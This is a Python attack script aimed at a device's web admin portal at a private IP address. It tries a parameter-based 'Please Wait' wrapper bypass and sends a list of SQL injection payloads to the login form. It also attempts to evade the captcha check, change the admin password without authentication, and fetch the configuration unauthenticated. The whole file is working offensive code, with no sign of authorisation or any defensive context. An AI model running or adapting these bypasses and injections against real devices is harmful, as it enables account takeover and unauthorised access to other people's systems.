import requests

TARGET = "http://10.0.0.1"
EXEC = f"{TARGET}/execute.js"
ADMIN = f"{TARGET}/admin/index"

# Test: can we bypass "Please Wait" with execute=1 on portal endpoint?
print("=== execute=1 bypass test ===")
s = requests.Session()
resp = s.post(f"{EXEC}?execute=1&exec=forgot", data={"license": "0", "sdcard": "1234567890"}, timeout=10)
print(f"Portal + execute=1: [{len(resp.text)}b] '{resp.text.strip()[:80]}'")

resp2 = s.post(f"{ADMIN}?execute=1&exec=login", data={"username": "admin", "password": "123456789"}, timeout=10)
print(f"Admin login: [{len(resp2.text)}b] '{resp2.text.strip()[:80]}'")

# Try SQL injection in portal login (no captcha needed when bypassing wrapper)
print("\n=== SQL Injection Tests ===")
sqli_payloads = [
    "admin' OR '1'='1",
    "admin' --",
    "admin'#",
    "admin'/*",
    "' OR 1=1 --",
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "admin' UNION SELECT 1,2,3 --",
    "admin' AND 1=1 --",
    "admin' AND 1=2 --",
]

for payload in sqli_payloads:
    s = requests.Session()
    resp = s.post(f"{ADMIN}?execute=1&exec=login",
                 data={"username": payload, "password": payload, "captcha": ""},
                 timeout=10)
    result = resp.text.strip()
    if result not in ["CAPTCHA code is not the same"]:
        print(f"  '{payload}': [{len(result)}b] '{result[:80]}'")

# Try without captcha parameter (which bypasses captcha check on forgot)
print("\n=== Login without captcha ===")
resp = requests.post(f"{ADMIN}?execute=1&exec=login",
                    data={"username": "admin", "password": "123456789"},
                    timeout=10)
print(f"  No captcha field: '{resp.text.strip()[:80]}'")

# Try with captcha=0 or captcha= (empty)
for cap in ["0", "", "test", "admin"]:
    resp = requests.post(f"{ADMIN}?execute=1&exec=login",
                        data={"username": "admin", "password": "123456789", "captcha": cap},
                        timeout=10)
    print(f"  captcha='{cap}': '{resp.text.strip()[:80]}'")

# Try change_password via admin (might not need auth)
print("\n=== Change password (no auth) ===")
for params in [{"execute": "1", "exec": "change_password"}, {"exec": "change_password"}]:
    resp = requests.post(f"{ADMIN}",
                        params=params,
                        data={"oldpassword": "123456789", "newpassword": "hacked123", "renewpassword": "hacked123"},
                        timeout=10)
    print(f"  {params}: '{resp.text.strip()[:80]}'")

# Try getconfig without auth
resp = requests.get(f"{ADMIN}?execute=1&exec=getconfig", timeout=10)
print(f"\ngetconfig: [{len(resp.text)}b] '{resp.text.strip()[:100]}'")
